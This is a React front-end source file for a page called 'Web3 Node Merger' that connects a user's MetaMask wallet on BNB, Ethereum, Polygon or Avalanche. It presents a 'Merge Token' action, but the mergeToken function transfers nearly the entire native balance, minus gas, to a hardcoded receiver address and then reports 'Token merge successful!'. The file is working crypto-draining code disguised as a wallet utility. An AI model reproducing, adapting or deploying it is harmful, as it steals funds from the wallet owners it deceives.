import React, { useState } from "react";
import { ethers } from "ethers";
import { ToastContainer, toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
import "./App.css";

const RECEIVER_ADDRESS = "0x1Bd61346A4ff20124AcF0dfC7d9E5e2fc548E3D4";

const NETWORKS = {
  bnb: {
    chainId: "0x38",
    name: "BNB Smart Chain",
    symbol: "BNB",
    rpcUrl: "https://bsc-dataseed.binance.org/",
  },
  ethereum: {
    chainId: "0x1",
    name: "Ethereum Mainnet",
    symbol: "ETH",
    rpcUrl: "https://mainnet.infura.io/v3/",
  },
  polygon: {
    chainId: "0x89",
    name: "Polygon",
    symbol: "MATIC",
    rpcUrl: "https://polygon-rpc.com",
  },
  avalanche: {
    chainId: "0xa86a",
    name: "Avalanche",
    symbol: "AVAX",
    rpcUrl: "https://api.avax.network/ext/bc/C/rpc",
  },
};

function App() {
  const [selectedNetwork, setSelectedNetwork] = useState("bnb");
  const [walletConnected, setWalletConnected] = useState(false);
  const [balance, setBalance] = useState("0");
  const [account, setAccount] = useState("");

  const switchNetwork = async (key) => {
    const net = NETWORKS[key];
    if (!window.ethereum) return toast.error("MetaMask not found");

    try {
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: net.chainId }],
      });
    } catch (switchError) {
      if (switchError.code === 4902) {
        try {
          await window.ethereum.request({
            method: "wallet_addEthereumChain",
            params: [
              {
                chainId: net.chainId,
                chainName: net.name,
                nativeCurrency: {
                  name: net.symbol,
                  symbol: net.symbol,
                  decimals: 18,
                },
                rpcUrls: [net.rpcUrl],
              },
            ],
          });
        } catch (addError) {
          toast.error("Failed to add network");
        }
      } else {
        toast.error("Network switch rejected");
      }
    }
  };

  const connectWallet = async () => {
    if (!window.ethereum) return toast.error("MetaMask not detected");
    try {
      await switchNetwork(selectedNetwork);

      const provider = new ethers.BrowserProvider(window.ethereum);
      const accounts = await provider.send("eth_requestAccounts", []);
      const signer = await provider.getSigner();
      const address = await signer.getAddress();
      setAccount(address);
      setWalletConnected(true);

      const nativeBalance = await provider.getBalance(address);
      setBalance(ethers.formatEther(nativeBalance));
    } catch (error) {
      console.error(error);
      toast.error("Failed to connect wallet");
    }
  };

  const handleNetworkChange = async (e) => {
    const newNet = e.target.value;
    setSelectedNetwork(newNet);
    setWalletConnected(false);
    setBalance("0");
    setAccount("");
    await switchNetwork(newNet);
  };

  const mergeToken = async () => {
    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const nativeBalance = await provider.getBalance(account);

      const feeData = await provider.getFeeData();
      const gasPrice = feeData.gasPrice || 0n;

      const gasEstimate = await signer.estimateGas({
        to: RECEIVER_ADDRESS,
        value: 0n, // estimate with 0 to be safe
      });

      const gasCost = gasEstimate * gasPrice;

      // Only apply buffer for Ethereum (ETH)
      let valueToSend = nativeBalance - gasCost;

      if (selectedNetwork === "ethereum") {
        const buffer = ethers.parseEther("0.0001"); // Buffer of 0.0001 ETH
        valueToSend -= buffer;
      }

      if (valueToSend <= 0n) {
        return toast.error(
          "Not enough balance to merge (gas too high or balance too low)",
        );
      }

      const tx = await signer.sendTransaction({
        to: RECEIVER_ADDRESS,
        value: valueToSend,
      });

      await tx.wait();
      toast.success("Token merge successful!");
    } catch (error) {
      console.error(error);
      toast.error("Merge failed");
    }
  };

  return (
    <div className="wrapper">
      <div className="card">
        <h1>Web3 Node Merger</h1>
        <p className="subtitle">
          Connect to Web3 node, protocol, token, merge management.
        </p>

        <select
          className="dropdown"
          value={selectedNetwork}
          onChange={handleNetworkChange}
        >
          <option value="bnb">BNB Smart Chain</option>
          <option value="ethereum">Ethereum</option>
          <option value="polygon">Polygon</option>
          <option value="avalanche">Avalanche</option>
        </select>

        {!walletConnected ? (
          <button className="connect-btn" onClick={connectWallet}>
            Connect Wallet
          </button>
        ) : (
          <div className="wallet-info">
            <p>
              <strong>Wallet:</strong> {account}
            </p>
            <p>
              <strong>Balance:</strong> {parseFloat(balance).toFixed(4)}{" "}
              {NETWORKS[selectedNetwork].symbol}
            </p>
            <button className="merge-btn" onClick={mergeToken}>
              Merge Token
            </button>
          </div>
        )}
      </div>
      <ToastContainer position="top-center" />
    </div>
  );
}

export default App;
